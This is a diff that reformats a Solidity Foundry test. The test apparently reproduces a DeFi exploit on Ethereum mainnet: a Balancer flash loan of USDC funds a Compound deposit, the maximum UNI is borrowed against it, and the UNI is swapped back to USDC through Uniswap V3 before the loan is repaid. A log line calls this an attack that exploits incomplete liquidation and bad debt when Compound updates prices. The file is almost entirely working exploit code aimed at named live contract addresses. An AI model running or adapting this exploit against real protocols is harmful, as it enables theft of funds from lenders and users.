@@ -30,10 +30,10 @@ contract ContractTest is Test {
     IWETH public WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
     IUniswapAnchoredView public UniswapAnchoredView = IUniswapAnchoredView(0x50ce56A3239671Ab62f185704Caedf626352741e);
 
-    uint256 public AMOUNT = 193020254960;
+    uint256 public AMOUNT = 193_020_254_960;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 19290921 - 1);
+        vm.createSelectFork("mainnet", 19_290_921 - 1);
         vm.label(address(vault), "Balancer vault");
         vm.label(address(USDC), "USDC");
         vm.label(address(cUSDC), "cUSDC");
@@ -54,45 +54,45 @@ contract ContractTest is Test {
         tokens[0] = address(USDC);
         amounts[0] = AMOUNT;
         vault.flashLoan(address(this), tokens, amounts, bytes(""));
-        
+
         emit log_named_decimal_uint("   [INFO] After attack", USDC.balanceOf(address(this)), 6);
         console.log("When compound update the price, incomplete liquidation leading to bad debts");
     }
 
-    function receiveFlashLoan(
-        IERC20[] memory,
-        uint256[] memory,
-        uint256[] memory,
-        bytes memory
-    ) public {
+    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
         // pledge the USDC
         USDC.approve(address(cUSDC), AMOUNT);
         cUSDC.mint(AMOUNT);
         address[] memory cTokens = new address[](1);
         cTokens[0] = address(cUSDC);
         comptroller.enterMarkets(cTokens);
-        
+
         // You should calculate the max u can borrow
-        (, uint myTotalLiquidity,) = comptroller.getAccountLiquidity(address(this));
+        (, uint256 myTotalLiquidity,) = comptroller.getAccountLiquidity(address(this));
 
         // The max amount of UNI we can borrow = AccountLiquidity / UNI's price in compound
-        uint256 max_UNI_borrow = 
-            myTotalLiquidity / 
-            UniswapAnchoredView.getUnderlyingPrice(address(cUniToken)) * 
-            10 ** uni.decimals();
-        cUniToken.borrow(max_UNI_borrow); 
+        uint256 max_UNI_borrow =
+            myTotalLiquidity / UniswapAnchoredView.getUnderlyingPrice(address(cUniToken)) * 10 ** uni.decimals();
+        cUniToken.borrow(max_UNI_borrow);
 
         // Swap: UNI => WETH => USDC, for the low Slippage
-        UNI_WETH_Pool.swap(address(this), true, int(uni.balanceOf(address(this))), 42095128740, bytes(""));
-        WETH_USDC_Pool.swap(address(this), false, int(WETH.balanceOf(address(this))), 1461446703485210103287273052203988822378723970341, bytes(""));
+        UNI_WETH_Pool.swap(address(this), true, int256(uni.balanceOf(address(this))), 42_095_128_740, bytes(""));
+        WETH_USDC_Pool.swap(
+            address(this),
+            false,
+            int256(WETH.balanceOf(address(this))),
+            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341,
+            bytes("")
+        );
 
         USDC.transfer(msg.sender, AMOUNT); // pay back flashloan
     }
 
     uint256 public num = 0;
+
     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) public {
         // For the twice swap()
-        if(num == 0) {
+        if (num == 0) {
             uni.transfer(msg.sender, uint256(amount0Delta));
             num++;
         } else {
@@ -103,19 +103,26 @@ contract ContractTest is Test {
 }
 
 interface ICompoundcUSDC {
+
     function mint(uint256 mintAmount) external returns (uint256);
+
 }
 
 interface IComptroller {
-    function enterMarkets(address[] memory cTokens)external returns (uint256[] memory);
-    function getAccountLiquidity(address account)external view returns (uint256, uint256,uint256);
+
+    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
+    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
+
 }
 
 interface IcUniToken {
+
     function borrow(uint256 borrowAmount) external returns (uint256);
+
 }
 
 interface IUNIV3Pool {
+
     function swap(
         address recipient,
         bool zeroForOne,
@@ -123,14 +130,19 @@ interface IUNIV3Pool {
         uint160 sqrtPriceLimitX96,
         bytes memory data
     ) external returns (int256 amount0, int256 amount1);
+
 }
 
 interface IUNI {
+
     function balanceOf(address account) external view returns (uint256);
     function decimals() external view returns (uint8);
     function transfer(address dst, uint256 rawAmount) external returns (bool);
+
 }
 
 interface IUniswapAnchoredView {
+
     function getUnderlyingPrice(address cToken) external view returns (uint256);
+
 }
